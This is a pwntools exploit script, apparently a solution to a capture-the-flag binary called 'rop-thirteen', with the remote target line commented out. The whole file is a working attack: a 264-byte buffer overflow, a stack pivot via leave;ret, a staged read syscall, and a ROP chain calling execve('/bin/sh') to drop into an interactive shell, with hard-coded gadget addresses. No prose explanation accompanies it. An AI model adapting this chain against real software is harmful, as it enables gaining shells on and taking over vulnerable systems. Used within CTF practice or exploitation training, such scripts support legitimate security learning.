from pwn import *

elf = context.binary = ELF('./rop-thirteen')

context.log_level='debug'

#p = remote("ctf.cybr.club", 443, ssl=True, sni="rop-thirteen")
#p = process('./rop-thirteen')
#p = gdb.debug('./rop-thirteen')
#p = remote('localhost', '1337')


p.recvuntil(b" characters):")
p.sendline(b"asdf")

# Writeable address in memory
writeable = 0x000000000051c000

# 0x000000000047ea5c : pop rdi ; or byte ptr [rax - 1], cl ; ret
pop_rdi_rax = 0x000000000047ea5c

# 0x00000000004112cf: mov rdi, rdx; mov rsi, rcx; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;
mov_rdx_rdi = 0x00000000004112cf

xor_rax_rax = 0x0000000000402481
pop_rax = 0x000000000040cc26
pop_rsi = 0x000000000041cf18
pop_rdx = 0x00000000004801bd
syscall = 0x000000000040278c
syscall_ret = 0x000000000045f409

leave_ret = 0x00000000004825da
ret = 0x000000000040103d

rbp = writeable
buf = b'A'*264 + p64(rbp)

# rax=0x100, rbp at 128 of buf, rdi = change, rsi = 0x100, rdx = 0x63

read = p64(pop_rax) + p64(writeable+1) + p64(pop_rdi_rax) + p64(0) + \
        p64(xor_rax_rax) + \
        p64(pop_rdx) + p64(0x100) + \
        p64(pop_rsi) + p64(writeable) + p64(syscall_ret)

binsh = writeable + 112 # 112 = length of execve payload

execve = p64(pop_rdx) + p64(binsh) + p64(mov_rdx_rdi) + p64(0) + p64(0) + p64(0) + \
        p64(pop_rax) + p64(0x3b) + \
        p64(pop_rdx) + p64(0x0) + \
        p64(pop_rsi) + p64(0) + p64(syscall_ret)

# need to stack pivot to writeable with pop rbp
payload = buf + read + p64(leave_ret)

print(len(payload))

p.recvuntil(b"feedback here:")
p.sendline(payload)

# Second payload is at writeable position, where we execve
payload2 = p64(rbp) + execve + b"/bin/sh\0"
print("Hit Enter to continue: ")
input()
p.sendline(payload2)

p.interactive()

